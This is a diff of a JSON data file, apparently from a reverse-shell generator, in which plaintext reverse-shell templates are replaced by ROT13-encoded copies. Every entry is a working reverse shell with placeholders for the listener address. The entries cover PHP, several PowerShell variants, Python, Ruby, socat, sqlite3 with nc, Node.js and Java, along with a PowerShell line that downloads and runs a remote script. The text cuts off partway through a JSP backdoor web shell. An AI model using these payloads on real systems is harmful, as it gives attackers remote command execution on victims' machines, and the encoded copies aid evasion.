+        "pbzznaq": "cuc -e '$fbpx=sfbpxbcra(\"{vc}\",{cbeg});cnffgueh(\"{furyy} <&3 >&3 2>&3\");'",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "PHP `",
-        "command": "php -r '$sock=fsockopen(\"{ip}\",{port});`{shell} <&3 >&3 2>&3`;'",
-        "type": ["linux", "windows", "mac"]
+        "anzr": "CUC `",
+        "pbzznaq": "cuc -e '$fbpx=sfbpxbcra(\"{vc}\",{cbeg});`{furyy} <&3 >&3 2>&3`;'",
+        "glcr": ["yvahk", "jvaqbjf", "znp"]
       },
       {
-        "name": "PHP popen",
-        "command": "php -r '$sock=fsockopen(\"{ip}\",{port});popen(\"{shell} <&3 >&3 2>&3\", \"r\");'",
-        "type": ["linux", "windows", "mac"]
+        "anzr": "CUC cbcra",
+        "pbzznaq": "cuc -e '$fbpx=sfbpxbcra(\"{vc}\",{cbeg});cbcra(\"{furyy} <&3 >&3 2>&3\", \"e\");'",
+        "glcr": ["yvahk", "jvaqbjf", "znp"]
       },
       {
-        "name": "PHP proc_open",
-        "command": "php -r '$sock=fsockopen(\"{ip}\",{port});$proc=proc_open(\"{shell}\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
-        "type": ["linux", "windows", "mac"]
+        "anzr": "CUC cebp_bcra",
+        "pbzznaq": "cuc -e '$fbpx=sfbpxbcra(\"{vc}\",{cbeg});$cebp=cebp_bcra(\"{furyy}\", neenl(0=>$fbpx, 1=>$fbpx, 2=>$fbpx),$cvcrf);'",
+        "glcr": ["yvahk", "jvaqbjf", "znp"]
       },
       {
-        "name": "Windows ConPty",
-        "command": "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}",
-        "type": ["windows"]
+        "anzr": "Jvaqbjf PbaCgl",
+        "pbzznaq": "VRK(VJE uggcf://enj.tvguhohfrepbagrag.pbz/nagbavbPbpb/PbaCglFuryy/znfgre/Vaibxr-PbaCglFuryy.cf1 -HfrOnfvpCnefvat); Vaibxr-PbaCglFuryy {vc} {cbeg}",
+        "glcr": ["jvaqbjf"]
       },
       {
-        "name": "PowerShell #1",
-        "command": "$LHOST = \"{ip}\"; $LPORT = {port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()",
-        "type": ["windows"]
+        "anzr": "CbjreFuryy #1",
+        "pbzznaq": "$YUBFG = \"{vc}\"; $YCBEG = {cbeg}; $GPCPyvrag = Arj-Bowrpg Arg.Fbpxrgf.GPCPyvrag($YUBFG, $YCBEG); $ArgjbexFgernz = $GPCPyvrag.TrgFgernz(); $FgernzErnqre = Arj-Bowrpg VB.FgernzErnqre($ArgjbexFgernz); $FgernzJevgre = Arj-Bowrpg VB.FgernzJevgre($ArgjbexFgernz); $FgernzJevgre.NhgbSyhfu = $gehr; $Ohssre = Arj-Bowrpg Flfgrz.Olgr[] 1024; juvyr ($GPCPyvrag.Pbaarpgrq) { juvyr ($ArgjbexFgernz.QngnNinvynoyr) { $EnjQngn = $ArgjbexFgernz.Ernq($Ohssre, 0, $Ohssre.Yratgu); $Pbqr = ([grkg.rapbqvat]::HGS8).TrgFgevat($Ohssre, 0, $EnjQngn -1) }; vs ($GPCPyvrag.Pbaarpgrq -naq $Pbqr.Yratgu -tg 1) { $Bhgchg = gel { Vaibxr-Rkcerffvba ($Pbqr) 2>&1 } pngpu { $_ }; $FgernzJevgre.Jevgr(\"$Bhgchg`a\"); $Pbqr = $ahyy } }; $GPCPyvrag.Pybfr(); $ArgjbexFgernz.Pybfr(); $FgernzErnqre.Pybfr(); $FgernzJevgre.Pybfr()",
+        "glcr": ["jvaqbjf"]
       },
       {
-        "name": "PowerShell #2",
-        "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
-        "type": ["windows"]
+        "anzr": "CbjreFuryy #2",
+        "pbzznaq": "cbjrefuryy -abc -p \"$pyvrag = Arj-Bowrpg Flfgrz.Arg.Fbpxrgf.GPCPyvrag('{vc}',{cbeg});$fgernz = $pyvrag.TrgFgernz();[olgr[]]$olgrf = 0..65535|%{0};juvyr(($v = $fgernz.Ernq($olgrf, 0, $olgrf.Yratgu)) -ar 0){;$qngn = (Arj-Bowrpg -GlcrAnzr Flfgrz.Grkg.NFPVVRapbqvat).TrgFgevat($olgrf,0, $v);$fraqonpx = (vrk $qngn 2>&1 | Bhg-Fgevat );$fraqonpx2 = $fraqonpx + 'CF ' + (cjq).Cngu + '> ';$fraqolgr = ([grkg.rapbqvat]::NFPVV).TrgOlgrf($fraqonpx2);$fgernz.Jevgr($fraqolgr,0,$fraqolgr.Yratgu);$fgernz.Syhfu()};$pyvrag.Pybfr()\"",
+        "glcr": ["jvaqbjf"]
       },
       {
-        "name": "PowerShell #3",
-        "command": "powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"",
-        "type": ["windows"]
+        "anzr": "CbjreFuryy #3",
+        "pbzznaq": "cbjrefuryy -abc -J uvqqra -abav -rc olcnff -p \"$GPCPyvrag = Arj-Bowrpg Arg.Fbpxrgf.GPCPyvrag('{vc}', {cbeg});$ArgjbexFgernz = $GPCPyvrag.TrgFgernz();$FgernzJevgre = Arj-Bowrpg VB.FgernzJevgre($ArgjbexFgernz);shapgvba JevgrGbFgernz ($Fgevat) {[olgr[]]$fpevcg:Ohssre = 0..$GPCPyvrag.ErprvirOhssreFvmr | % {0};$FgernzJevgre.Jevgr($Fgevat + 'FURYY> ');$FgernzJevgre.Syhfu()}JevgrGbFgernz '';juvyr(($OlgrfErnq = $ArgjbexFgernz.Ernq($Ohssre, 0, $Ohssre.Yratgu)) -tg 0) {$Pbzznaq = ([grkg.rapbqvat]::HGS8).TrgFgevat($Ohssre, 0, $OlgrfErnq - 1);$Bhgchg = gel {Vaibxr-Rkcerffvba $Pbzznaq 2>&1 | Bhg-Fgevat} pngpu {$_ | Bhg-Fgevat}JevgrGbFgernz ($Bhgchg)}$FgernzJevgre.Pybfr()\"",
+        "glcr": ["jvaqbjf"]
       },
       {
-        "name": "PowerShell #4 (TLS)",
-        "command": "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()",
-        "type": ["windows"]
+        "anzr": "CbjreFuryy #4 (GYF)",
+        "pbzznaq": "$ffyCebgbpbyf = [Flfgrz.Frphevgl.Nhguragvpngvba.FfyCebgbpbyf]::Gyf12; $GPCPyvrag = Arj-Bowrpg Arg.Fbpxrgf.GPCPyvrag('{vc}', {cbeg});$ArgjbexFgernz = $GPCPyvrag.TrgFgernz();$FfyFgernz = Arj-Bowrpg Arg.Frphevgl.FfyFgernz($ArgjbexFgernz,$snyfr,({$gehr} -nf [Arg.Frphevgl.ErzbgrPregvsvpngrInyvqngvbaPnyyonpx]));$FfyFgernz.NhguragvpngrNfPyvrag('pybhqsyner-qaf.pbz',$ahyy,$ffyCebgbpbyf,$snyfr);vs(!$FfyFgernz.VfRapelcgrq -be !$FfyFgernz.VfFvtarq) {$FfyFgernz.Pybfr();rkvg}$FgernzJevgre = Arj-Bowrpg VB.FgernzJevgre($FfyFgernz);shapgvba JevgrGbFgernz ($Fgevat) {[olgr[]]$fpevcg:Ohssre = Arj-Bowrpg Flfgrz.Olgr[] 4096 ;$FgernzJevgre.Jevgr($Fgevat + 'FURYY> ');$FgernzJevgre.Syhfu()};JevgrGbFgernz '';juvyr(($OlgrfErnq = $FfyFgernz.Ernq($Ohssre, 0, $Ohssre.Yratgu)) -tg 0) {$Pbzznaq = ([grkg.rapbqvat]::HGS8).TrgFgevat($Ohssre, 0, $OlgrfErnq - 1);$Bhgchg = gel {Vaibxr-Rkcerffvba $Pbzznaq 2>&1 | Bhg-Fgevat} pngpu {$_ | Bhg-Fgevat}JevgrGbFgernz ($Bhgchg)}$FgernzJevgre.Pybfr()",
+        "glcr": ["jvaqbjf"]
       },
       {
-        "name": "PowerShell #3 (Base64)",
-        "type": ["windows"]
+        "anzr": "CbjreFuryy #3 (Onfr64)",
+        "glcr": ["jvaqbjf"]
       },
       {
-        "name": "Python #1",
-        "command": "export RHOST=\"{ip}\";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
-        "type": ["linux", "mac"]
+        "anzr": "Clguba #1",
+        "pbzznaq": "rkcbeg EUBFG=\"{vc}\";rkcbeg ECBEG={cbeg};clguba -p 'vzcbeg flf,fbpxrg,bf,cgl;f=fbpxrg.fbpxrg();f.pbaarpg((bf.trgrai(\"EUBFG\"),vag(bf.trgrai(\"ECBEG\"))));[bf.qhc2(f.svyrab(),sq) sbe sq va (0,1,2)];cgl.fcnja(\"{furyy}\")'",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "Python #2",
-        "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'",
-        "type": ["linux", "mac"]
+        "anzr": "Clguba #2",
+        "pbzznaq": "clguba -p 'vzcbeg fbpxrg,fhocebprff,bf;f=fbpxrg.fbpxrg(fbpxrg.NS_VARG,fbpxrg.FBPX_FGERNZ);f.pbaarpg((\"{vc}\",{cbeg}));bf.qhc2(f.svyrab(),0); bf.qhc2(f.svyrab(),1);bf.qhc2(f.svyrab(),2);vzcbeg cgl; cgl.fcnja(\"{furyy}\")'",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "Python3 #1",
-        "command": "export RHOST=\"{ip}\";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
-        "type": ["linux", "mac"]
+        "anzr": "Clguba3 #1",
+        "pbzznaq": "rkcbeg EUBFG=\"{vc}\";rkcbeg ECBEG={cbeg};clguba3 -p 'vzcbeg flf,fbpxrg,bf,cgl;f=fbpxrg.fbpxrg();f.pbaarpg((bf.trgrai(\"EUBFG\"),vag(bf.trgrai(\"ECBEG\"))));[bf.qhc2(f.svyrab(),sq) sbe sq va (0,1,2)];cgl.fcnja(\"{furyy}\")'",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "Python3 #2",
-        "command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'",
-        "type": ["linux", "mac"]
+        "anzr": "Clguba3 #2",
+        "pbzznaq": "clguba3 -p 'vzcbeg fbpxrg,fhocebprff,bf;f=fbpxrg.fbpxrg(fbpxrg.NS_VARG,fbpxrg.FBPX_FGERNZ);f.pbaarpg((\"{vc}\",{cbeg}));bf.qhc2(f.svyrab(),0); bf.qhc2(f.svyrab(),1);bf.qhc2(f.svyrab(),2);vzcbeg cgl; cgl.fcnja(\"{furyy}\")'",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "Python3 Windows",
-        "command": "import os,socket,subprocess,threading;\ndef s2p(s, p):\n    while True:\n        data = s.recv(1024)\n        if len(data) > 0:\n            p.stdin.write(data)\n            p.stdin.flush()\n\ndef p2s(s, p):\n    while True:\n        s.send(p.stdout.read(1))\n\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"{ip}\",{port}))\n\np=subprocess.Popen([\"{shell}\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)\n\ns2p_thread = threading.Thread(target=s2p, args=[s, p])\ns2p_thread.daemon = True\ns2p_thread.start()\n\np2s_thread = threading.Thread(target=p2s, args=[s, p])\np2s_thread.daemon = True\np2s_thread.start()\n\ntry:\n    p.wait()\nexcept KeyboardInterrupt:\n    s.close()",
-        "type": ["windows"]
+        "anzr": "Clguba3 Jvaqbjf",
+        "pbzznaq": "vzcbeg bf,fbpxrg,fhocebprff,guernqvat;\aqrs f2c(f, c):\a    juvyr Gehr:\a        qngn = f.erpi(1024)\a        vs yra(qngn) > 0:\a            c.fgqva.jevgr(qngn)\a            c.fgqva.syhfu()\a\aqrs c2f(f, c):\a    juvyr Gehr:\a        f.fraq(c.fgqbhg.ernq(1))\a\af=fbpxrg.fbpxrg(fbpxrg.NS_VARG,fbpxrg.FBPX_FGERNZ)\af.pbaarpg((\"{vc}\",{cbeg}))\a\ac=fhocebprff.Cbcra([\"{furyy}\"], fgqbhg=fhocebprff.CVCR, fgqree=fhocebprff.FGQBHG, fgqva=fhocebprff.CVCR)\a\af2c_guernq = guernqvat.Guernq(gnetrg=f2c, netf=[f, c])\af2c_guernq.qnrzba = Gehr\af2c_guernq.fgneg()\a\ac2f_guernq = guernqvat.Guernq(gnetrg=c2f, netf=[f, c])\ac2f_guernq.qnrzba = Gehr\ac2f_guernq.fgneg()\a\agel:\a    c.jnvg()\arkprcg XrlobneqVagreehcg:\a    f.pybfr()",
+        "glcr": ["jvaqbjf"]
       },
       {
-        "name": "Python3 shortest",
-        "command": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"{shell}\")'",
-        "type": ["linux"]
+        "anzr": "Clguba3 fubegrfg",
+        "pbzznaq": "clguba3 -p 'vzcbeg bf,cgl,fbpxrg;f=fbpxrg.fbpxrg();f.pbaarpg((\"{vc}\",{cbeg}));[bf.qhc2(f.svyrab(),s)sbe s va(0,1,2)];cgl.fcnja(\"{furyy}\")'",
+        "glcr": ["yvahk"]
       },
       {
-        "name": "Ruby #1",
-        "command": "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",{port}))'",
-        "type": ["linux", "mac"]
+        "anzr": "Ehol #1",
+        "pbzznaq": "ehol -efbpxrg -r'fcnja(\"fu\",[:va,:bhg,:ree]=>GPCFbpxrg.arj(\"{vc}\",{cbeg}))'",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "Ruby no sh",
-        "command": "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'",
-        "type": ["linux", "mac"]
+        "anzr": "Ehol ab fu",
+        "pbzznaq": "ehol -efbpxrg -r'rkvg vs sbex;p=GPCFbpxrg.arj(\"{vc}\",\"{cbeg}\");ybbc{p.trgf.pubzc!;(rkvg! vs $_==\"rkvg\");($_=~/pq (.+)/v?(Qve.puqve($1)):(VB.cbcra($_,?e){|vb|p.cevag vb.ernq}))erfphr p.chgf \"snvyrq: #{$_}\"}'",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "socat #1",
-        "command": "socat TCP:{ip}:{port} EXEC:{shell}",
-        "type": ["linux", "mac"]
+        "anzr": "fbpng #1",
+        "pbzznaq": "fbpng GPC:{vc}:{cbeg} RKRP:{furyy}",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "socat #2 (TTY)",
-        "command": "socat TCP:{ip}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane",
-        "type": ["linux", "mac"]
+        "anzr": "fbpng #2 (GGL)",
+        "pbzznaq": "fbpng GPC:{vc}:{cbeg} RKRP:'{furyy}',cgl,fgqree,frgfvq,fvtvag,fnar",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "sqlite3 nc mkfifo",
-        "command": "sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f'",
-        "type": ["linux", "mac"]
+        "anzr": "fdyvgr3 ap zxsvsb",
+        "pbzznaq": "fdyvgr3 /qri/ahyy '.furyy ez /gzc/s;zxsvsb /gzc/s;png /gzc/s|{furyy} -v 2>&1|ap {vc} {cbeg} >/gzc/s'",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "node.js",
-        "command": "require('child_process').exec('nc -e {shell} {ip} {port}')",
-        "type": ["linux", "mac"]
+        "anzr": "abqr.wf",
+        "pbzznaq": "erdhver('puvyq_cebprff').rkrp('ap -r {furyy} {vc} {cbeg}')",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "node.js #2",
-        "command": "(function(){\r\n    var net = require(\"net\"),\r\n        cp = require(\"child_process\"),\r\n        sh = cp.spawn(\"{shell}\", []);\r\n    var client = new net.Socket();\r\n    client.connect({port}, \"{ip}\", function(){\r\n        client.pipe(sh.stdin);\r\n        sh.stdout.pipe(client);\r\n        sh.stderr.pipe(client);\r\n    });\r\n    return \/a\/; \/\/ Prevents the Node.js application from crashing\r\n})();",
-        "type": ["linux", "mac", "windows"]
+        "anzr": "abqr.wf #2",
+        "pbzznaq": "(shapgvba(){\e\a    ine arg = erdhver(\"arg\"),\e\a        pc = erdhver(\"puvyq_cebprff\"),\e\a        fu = pc.fcnja(\"{furyy}\", []);\e\a    ine pyvrag = arj arg.Fbpxrg();\e\a    pyvrag.pbaarpg({cbeg}, \"{vc}\", shapgvba(){\e\a        pyvrag.cvcr(fu.fgqva);\e\a        fu.fgqbhg.cvcr(pyvrag);\e\a        fu.fgqree.cvcr(pyvrag);\e\a    });\e\a    erghea \/n\/; \/\/ Ceriragf gur Abqr.wf nccyvpngvba sebz penfuvat\e\a})();",
+        "glcr": ["yvahk", "znp", "jvaqbjf"]
       },
       {
-        "name": "Java #1",
-        "command": "public class shell {\n    public static void main(String[] args) {\n        Process p;\n        try {\n            p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/{ip}/{port} 0>&1\");\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}",
-        "type": ["linux", "mac"]
+        "anzr": "Wnin #1",
+        "pbzznaq": "choyvp pynff furyy {\a    choyvp fgngvp ibvq znva(Fgevat[] netf) {\a        Cebprff c;\a        gel {\a            c = Ehagvzr.trgEhagvzr().rkrp(\"onfu -p $@|onfu 0 rpub onfu -v >& /qri/gpc/{vc}/{cbeg} 0>&1\");\a            c.jnvgSbe();\a            c.qrfgebl();\a        } pngpu (Rkprcgvba r) {}\a    }\a}",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "Java #2",
-        "command": "public class shell {\n    public static void main(String[] args) {\n        ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"$@| bash -i >& /dev/tcp/{ip}/{port} 0>&1\")\n            .redirectErrorStream(true);\n        try {\n            Process p = pb.start();\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}",
-        "type": ["linux", "mac"]
+        "anzr": "Wnin #2",
+        "pbzznaq": "choyvp pynff furyy {\a    choyvp fgngvp ibvq znva(Fgevat[] netf) {\a        CebprffOhvyqre co = arj CebprffOhvyqre(\"onfu\", \"-p\", \"$@| onfu -v >& /qri/gpc/{vc}/{cbeg} 0>&1\")\a            .erqverpgReebeFgernz(gehr);\a        gel {\a            Cebprff c = co.fgneg();\a            c.jnvgSbe();\a            c.qrfgebl();\a        } pngpu (Rkprcgvba r) {}\a    }\a}",
+        "glcr": ["yvahk", "znp"]
       },
       {
-        "name": "Java #3",
-        "command": "import java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class shell {\n    public static void main(String[] args) {\n        String host = \"{ip}\";\n        int port = {port};\n        String cmd = \"{shell}\";\n        try {\n            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\n            Socket s = new Socket(host, port);\n            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\n            OutputStream po = p.getOutputStream(), so = s.getOutputStream();\n            while (!s.isClosed()) {\n                while (pi.available() > 0)\n                    so.write(pi.read());\n                while (pe.available() > 0)\n                    so.write(pe.read());\n                while (si.available() > 0)\n                    po.write(si.read());\n                so.flush();\n                po.flush();\n                Thread.sleep(50);\n                try {\n                    p.exitValue();\n                    break;\n                } catch (Exception e) {}\n            }\n            p.destroy();\n            s.close();\n        } catch (Exception e) {}\n    }\n}",
-        "type": ["windows", "linux", "mac"]
+        "anzr": "Wnin #3",
+        "pbzznaq": "vzcbeg wnin.vb.VachgFgernz;\avzcbeg wnin.vb.BhgchgFgernz;\avzcbeg wnin.arg.Fbpxrg;\a\achoyvp pynff furyy {\a    choyvp fgngvp ibvq znva(Fgevat[] netf) {\a        Fgevat ubfg = \"{vc}\";\a        vag cbeg = {cbeg};\a        Fgevat pzq = \"{furyy}\";\a        gel {\a            Cebprff c = arj CebprffOhvyqre(pzq).erqverpgReebeFgernz(gehr).fgneg();\a            Fbpxrg f = arj Fbpxrg(ubfg, cbeg);\a            VachgFgernz cv = c.trgVachgFgernz(), cr = c.trgReebeFgernz(), fv = f.trgVachgFgernz();\a            BhgchgFgernz cb = c.trgBhgchgFgernz(), fb = f.trgBhgchgFgernz();\a            juvyr (!f.vfPybfrq()) {\a                juvyr (cv.ninvynoyr() > 0)\a                    fb.jevgr(cv.ernq());\a                juvyr (cr.ninvynoyr() > 0)\a                    fb.jevgr(cr.ernq());\a                juvyr (fv.ninvynoyr() > 0)\a                    cb.jevgr(fv.ernq());\a                fb.syhfu();\a                cb.syhfu();\a                Guernq.fyrrc(50);\a                gel {\a                    c.rkvgInyhr();\a                    oernx;\a                } pngpu (Rkprcgvba r) {}\a            }\a            c.qrfgebl();\a            f.pybfr();\a        } pngpu (Rkprcgvba r) {}\a    }\a}",
+        "glcr": ["jvaqbjf", "yvahk", "znp"]
       },
       {
-        "name": "Java Web",
-        "command": "<%@\r\npage import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"\r\n% >\r\n<%!\r\nstatic class StreamConnector extends Thread\r\n{\r\n        InputStream is;\r\n        OutputStream os;\r\n        StreamConnector(InputStream is, OutputStream os)\r\n        {\r\n                this.is = is;\r\n                this.os = os;\r\n        }\r\n        public void run()\r\n        {\r\n                BufferedReader isr = null;\r\n                BufferedWriter osw = null;\r\n                try\r\n                {\r\n                        isr = new BufferedReader(new InputStreamReader(is));\r\n                        osw = new BufferedWriter(new OutputStreamWriter(os));\r\n                        char buffer[] = new char[8192];\r\n                        int lenRead;\r\n                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)\r\n                        {\r\n                                osw.write(buffer, 0, lenRead);\r\n                                osw.flush();\r\n                        }\r\n                }\r\n                catch (Exception ioe)\r\n                try\r\n                {\r\n                        if(isr != null) isr.close();\r\n                        if(osw != null) osw.close();\r\n                }\r\n                catch (Exception ioe)\r\n        }\r\n}\r\n%>\r\n\r\n<h1>JSP Backdoor Reverse Shell<\/h1>\r\n\r\n<form method=\"post\">\r\nIP Address\r\n<input type=\"text\" name=\"ipaddress\" size=30>\r\nPort\r\n<input type=\"text\" name=\"port\" size=10>\r\n<input type=\"submit\" name=\"Connect\" value=\"Connect\">\r\n<\/form>\r\n<p>\r\n<hr>\r\n\r\n<%\r\nString ipAddress = request.getParameter(\"ipaddress\");\r\nString ipPort = request.getParameter(\"port\");\r\nif(ipAddress != null && ipPort != null)\r\n{\r\n        Socket sock = null;\r\n        try\r\n        {\r\n                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());\r\n                Runtime rt = Runtime.getRuntime();\r\n                Process proc = rt.exec(\"cmd.exe\");\r\n                StreamConnector outputConnector =\r\n                        new StreamConnector(proc.getInputStream(),\r\n                                          sock.getOutputStream());\r\n                StreamConnector inputConnector =\r\n                        new StreamConnector(sock.getInputStream(),\r\n                                          proc.getOutputStream());\r\n                outputConnector.start();\r\n                inputConnector.start();\r\n        }\r\n        catch(Exception e) \r\n}\r\n%>",
-        "type": ["windows", "linux", "mac"]
+        "anzr": "Wnin Jro",
+        "pbzznaq": "<%@\e\acntr vzcbeg=\"wnin.ynat.*, wnin.hgvy.*, wnin.vb.*, wnin.arg.*\"\e\a% >\e\a<%!\e\afgngvp pynff FgernzPbaarpgbe rkgraqf Guernq\e\a{\e\a        VachgFgernz vf;\e\a        BhgchgFgernz bf;\e\a        FgernzPbaarpgbe(VachgFgernz vf, BhgchgFgernz bf)\e\a        {\e\a                guvf.vf = vf;\e\a                guvf.bf = bf;\e\a        }\e\a        choyvp ibvq eha()\e\a        {\e\a                OhssrerqErnqre vfe = ahyy;\e\a                OhssrerqJevgre bfj = ahyy;\e\a                gel\e\a                {\e\a                        vfe = arj OhssrerqErnqre(arj VachgFgernzErnqre(vf));\e\a                        bfj = arj OhssrerqJevgre(arj BhgchgFgernzJevgre(bf));\e\a                        pune ohssre[] = arj pune[8192];\e\a                        vag yraErnq;\e\a                        juvyr( (yraErnq = vfe.ernq(ohssre, 0, ohssre.yratgu)) > 0)\e\a                        {\e\a                                bfj.jevgr(ohssre, 0, yraErnq);\e\a                                bfj.syhfu();\e\a                        }\e\a                }\e\a                pngpu (Rkprcgvba vbr)\e\a                gel\e\a                {\e\a                        vs(vfe != ahyy) vfe.pybfr();\e\a                        vs(bfj != ahyy) bfj.pybfr();\e\a                }\e\a                pngpu (Rkprcgvba vbr)\e\a        }\e\a}\e\a%>\e\a\e\a<u1>WFC Onpxqbbe Erirefr Furyy<\/u1>\e\a\e\a<sbez zrgubq=\"cbfg\">\e\aVC Nqqerff\e\a<vachg glcr=\"grkg\" anzr=\"vcnqqerff\" fvmr=30>\e\aCbeg\e\a<vachg glcr=\"grkg\" anzr=\"cbeg\" fvmr=10>\e\a<vachg glcr=\"fhozvg\" anzr=\"Pbaarpg\" inyhr=\"Pbaarpg\">\e\a<\/sbez>\e\a<c>\e\a<ue>\e\a\e\a<%\e\aFgevat vcNqqerff = erdhrfg.trgCnenzrgre(\"vcnqqerff\");\e\aFgevat vcCbeg = erdhrfg.trgCnenzrgre(\"cbeg\");\e\avs(vcNqqerff != ahyy && vcCbeg != ahyy)\e\a{\e\a        Fbpxrg fbpx = ahyy;\e\a        gel\e\a        {\e\a                fbpx = arj Fbpxrg(vcNqqerff, (arj Vagrtre(vcCbeg)).vagInyhr());\e\a                Ehagvzr eg = Ehagvzr.trgEhagvzr();\e\a                Cebprff cebp = eg.rkrp(\"pzq.rkr\");\e\a                FgernzPbaarpgbe bhgchgPbaarpgbe =\e\a                        arj FgernzPbaarpgbe(cebp.trgVachgFgernz(),\e\a                                          fbpx.trgBhgchgFgernz());\e\a                FgernzPbaarpgbe vachgPbaarpgbe =\e\a                        arj FgernzPbaarpgbe(fbpx.trgVachgFgernz(),\e\a                                          cebp.trgBhgchgFgernz());\e\a                bhgchgPbaarpgbe.fgneg();\e\a                vachgPbaarpgbe.fgneg();\e\a        }\e\a        